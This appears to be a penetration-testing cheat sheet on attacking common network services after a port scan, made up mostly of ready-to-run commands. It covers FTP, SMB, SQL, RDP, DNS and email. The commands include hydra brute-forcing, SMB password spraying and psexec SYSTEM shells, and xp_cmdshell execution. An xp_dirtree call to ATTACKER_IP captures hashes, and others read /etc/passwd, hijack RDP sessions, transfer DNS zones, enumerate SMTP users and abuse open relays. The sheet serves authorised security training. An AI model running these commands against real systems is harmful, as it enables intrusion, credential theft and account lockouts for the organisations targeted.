---
tool: Attacking common services
slug: attacking-services
kind: technique
stages: [network, active-directory, windows]
category: FTP, SMB, SQL, RDP, DNS and email attacks
platforms: [network, linux, windows]
services: [ftp, smb, mssql, mysql, rdp, dns, smtp, imap, pop3]
ports: [21, 25, 53, 110, 143, 445, 1433, 3306, 3389]
tags: [ftp, smb, mssql, rdp, dns, smtp, brute-force, zone-transfer, xp_cmdshell, relay]
attack: [T1110, T1210, T1021, T1046]
summary: Past enumeration: turning an open service into access. Anonymous and brute-forced logins, SQL command execution, RDP session hijack, DNS zone transfers, and SMTP user enumeration and relay. The attack side of the services you found on the port scan.
references:
  - HackTricks: pentesting ports | https://book.hacktricks.wiki/en/network-services-pentesting/index.html
  - The Hacker Recipes | https://www.thehacker.recipes/
---

## When to reach for it

After the port scan and service enumeration, when you have an open service and want access or execution, not just a banner. Enumeration (`service-enum`, `smb-enum`, `snmp-enum`) tells you what is there; this is what you do with it. Always try the unauthenticated angle first, then weak and default credentials, then the service-specific abuse.

## FTP (21)

```bash
ftp TARGET                                   # try anonymous / anonymous
nmap -p21 --script ftp-anon,ftp-bounce TARGET
hydra -L users.txt -P pass.txt ftp://TARGET  # brute a real login
# writable root + a web root served from it = upload a webshell
```

## SMB (445)

Enumerate first (see the [SMB enumeration note](/cpts/#tool-smb-enum)); the attacks are spray, execute and relay:

```bash
netexec smb TARGET -u users.txt -p 'Welcome1' --continue-on-success   # spray
netexec smb TARGET -u user -p pass -x whoami                          # exec (Pwn3d!)
impacket-psexec 'DOMAIN/user:pass@TARGET'                             # SYSTEM shell
# coerce + relay unsigned SMB -> see responder / ntlm-relay notes
```

## SQL: MSSQL (1433) & MySQL (3306)

Fuller coverage is in the [database-attacks note](/cpts/#tool-database-attacks); the headline is command execution:

```bash
impacket-mssqlclient 'DOMAIN/user:pass@TARGET' -windows-auth
# in the SQL shell:
#   enable_xp_cmdshell;  xp_cmdshell 'whoami'
#   EXEC xp_dirtree '\\ATTACKER_IP\share';   -- capture the service NetNTLM hash
mysql -h TARGET -u root -p                   # then: SELECT load_file('/etc/passwd');
```

## RDP (3389)

Brute and hijack; Pass-the-Hash RDP is in the [RDP access note](/cpts/#tool-rdp-access):

```bash
hydra -L users.txt -p 'Welcome1' rdp://TARGET            # keep -t low
# session hijack as SYSTEM (no password), when another user has a disconnected session:
query user & tscon <ID> /dest:rdp-tcp#<n>
```

## DNS (53)

```bash
dig axfr @TARGET DOMAIN                       # zone transfer: the whole namespace
dnsenum --dnsserver TARGET DOMAIN
nsupdate                                      # dynamic updates: add a record if allowed
```

## Email (25/110/143/587)

```bash
nmap -p25 --script smtp-commands,smtp-enum-users TARGET
smtp-user-enum -M RCPT -U users.txt -D DOMAIN -t TARGET   # valid-user oracle
swaks --to user@DOMAIN --from a@b --server TARGET --body "test"   # open relay / phishing
hydra -l user -P pass.txt pop3://TARGET
```

## Notes

Service attacks are loud and some are destructive (a relay authenticates as a real user; a brute can lock accounts; `xp_cmdshell` runs as the SQL service account). Stay inside scope, mind the lockout policy, and record which service and account yielded access. Captured hashes and credentials are sensitive loot to handle with the engagement data. In-scope, authorised testing only.
